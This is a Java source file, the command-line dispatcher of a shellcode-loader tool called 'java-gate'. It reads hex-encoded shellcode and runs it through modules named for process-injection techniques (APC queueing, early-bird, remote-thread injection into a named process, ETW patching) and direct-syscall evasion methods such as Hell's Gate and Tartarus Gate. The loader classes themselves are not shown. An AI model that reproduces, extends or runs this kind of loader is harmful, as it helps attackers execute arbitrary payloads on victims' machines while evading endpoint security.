package me.n1ar4.gate.cli;

import me.n1ar4.gate.core.*;
import me.n1ar4.gate.loader.*;
import me.n1ar4.gate.util.ByteUtil;

/**
 * Cli application of java-gate project
 */
public class Main {
    private static void usage() {
        System.out.println("usage: java -jar java-gate.jar [module] [shellcode-hex-string] [optional]");
    }

    public static void main(String[] args) {
        System.out.println("###########################");
        System.out.println("#      JAVA-GATE-CLI      #");
        System.out.println("###########################");
        System.out.println("loader: apc1|apc2|crt|divide|early-bird|etwp|rip");
        System.out.println("syscall: hells-gate|halos-gate|recycled-gate|tartarus-gate|ssn-syscall");
        System.out.println("run-new-jvm: java -jar run-new-jvm [module] [shellcode-hex-string]");

        usage();
        if (args.length < 2) {
            System.out.println("input error");
            return;
        }

        String module = args[0].trim();
        String hex = args[1].trim();

        byte[] shellcode = ByteUtil.hexStringToByteArray(hex);
        if (shellcode.length == 0) {
            System.out.println("shellcode is null");
            return;
        }

        if (module.equals("apc1")) {
            System.out.println("use module apc1");
            new APC1Loader(shellcode).execAndWait();
            return;
        }

        if (module.equals("apc2")) {
            System.out.println("use module apc2");
            new APC2Loader(shellcode).execAndWait();
            return;
        }

        if (module.equals("divide")) {
            System.out.println("use module divide");
            new DivideLoader(shellcode).execAndWait();
            return;
        }

        if (module.equals("early-bird")) {
            System.out.println("use module early-bird");
            new EarlyBirdLoader(shellcode).execAndWait();
            return;
        }

        if (module.equals("etwp")) {
            System.out.println("use module etwp");
            new ETWPLoader(shellcode).execAndWait();
            return;
        }

        if (module.equals("rip")) {
            System.out.println("use module etwp");
            new RIPLoader(shellcode).execAndWait();
            return;
        }

        if (module.equals("crt")) {
            System.out.println("use module crt");
            if (args.length != 3) {
                System.out.println("need optional process name");
                return;
            }
            new CRTLoader(shellcode).execAndWait(args[2]);
            return;
        }

        if (module.equals("hells-gate")) {
            System.out.println("use module hells-gate");
            new HellsGate(shellcode).execAndWait();
            return;
        }
        if (module.equals("halos-gate")) {
            System.out.println("use module halos-gate");
            new HalosGate(shellcode).execAndWait();
            return;
        }
        if (module.equals("recycled-gate")) {
            System.out.println("use module recycled-gate");
            new RecycledGate(shellcode).execAndWait();
            return;
        }
        if (module.equals("ssn-syscall")) {
            System.out.println("use module ssn-syscall");
            new SSNSyscall(shellcode).execAndWait();
            return;
        }
        if (module.equals("tartarus-gate")) {
            System.out.println("use module tartarus-gate");
            new TartarusGate(shellcode).execAndWait();
        }

        if (module.equals("run-new-jvm")) {
            System.out.println("run a new jvm");
            if (args.length != 3) {
                System.out.println("need 3 args");
                return;
            }
            String realModule = args[1];
            String hexShell = args[2];
            JavaGate gate = new JavaGate(hexShell);
            gate.runNewJVM(realModule, false);
        }
    }
}
